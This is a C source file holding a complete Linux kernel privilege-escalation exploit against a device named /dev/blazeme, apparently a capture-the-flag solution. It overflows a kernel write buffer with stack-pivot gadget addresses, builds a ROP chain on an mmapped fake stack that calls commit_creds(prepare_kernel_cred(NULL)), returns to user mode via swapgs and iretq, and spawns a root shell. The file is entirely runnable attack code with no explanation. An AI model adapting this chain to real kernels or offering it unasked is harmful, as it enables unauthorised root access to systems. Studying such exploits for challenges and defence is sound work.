#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>


unsigned long long user_cs;
unsigned long long user_ss;
unsigned long long user_rflags;

void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "mov %1, ss\n\t"
            "pushfq\n\t"
            "pop %2"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
            :
            : "memory"
            );
}

void shell(void) {
    system("/bin/sh");
}

// ROP gadgets
unsigned long long addr_pivot_gadget = 0xffffffff81034e60; // : mov esp, 0x5d0006ba ; ret
unsigned long long addr_pop_rdi = 0xffffffff811664cc;
unsigned long long addr_pop_rdx = 0xffffffff81148e10;
unsigned long long addr_mov_rdi_rax_call_rdx = 0xffffffff81085026;
unsigned long long addr_swapgs_pop_rbp = 0xffffffff8103b904;
unsigned long long addr_iretq = 0xffffffff8101cf06;

// functions
unsigned long long addr_commit_creds = 0xffffffff81063960;
unsigned long long addr_prepare_kernel_cred = 0xffffffff81063b50;

unsigned long long addr_stack = 0x5d0006ba;


int main(void) {
    int fd;
    int i;
    char payload[64];
    unsigned long long *stack;
    unsigned long long addr_mmap = addr_stack & ~0xfffULL;

    save_state();

    fd = open("/dev/blazeme", O_RDWR);
    printf("[+] Open /dev/blazeme\n");
    if (fd < 0) {
        return 1;
    }

    memset(payload, 'A', 2);
    memset(payload + 64 - 6, 'B', 6);
    for (i = 0; i < 7; ++i) {
        *(unsigned long long *)(payload + 2 + i * 8) = addr_pivot_gadget;
    }

    if (mmap((void *)addr_mmap, 0x10000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0) != (void *)addr_mmap) {
        perror("mmap");
        return 1;
    }
    stack = (unsigned long long *)addr_stack;
    // commit_creds(prepare_kernel_cred(NULL))
    *stack ++= addr_pop_rdi;
    *stack ++= 0ULL;
    *stack ++= addr_prepare_kernel_cred;
    *stack ++= addr_pop_rdx;
    *stack ++= (addr_commit_creds + 2); // skip `push rbp;`
    *stack ++= addr_mov_rdi_rax_call_rdx;
    // return to user-space
    *stack ++= addr_swapgs_pop_rbp;
    *stack ++= 0xdeadbeefcafebabe;
    *stack ++= addr_iretq;
    *stack ++= (unsigned long long)shell;
    *stack ++= user_cs;
    *stack ++= user_rflags;
    *stack ++= addr_mmap + 0x5000;
    *stack ++= user_ss;

    while (1) {
        printf("[+] Write payload\n");
        write(fd, payload, 64);
    }
    return 0;
}
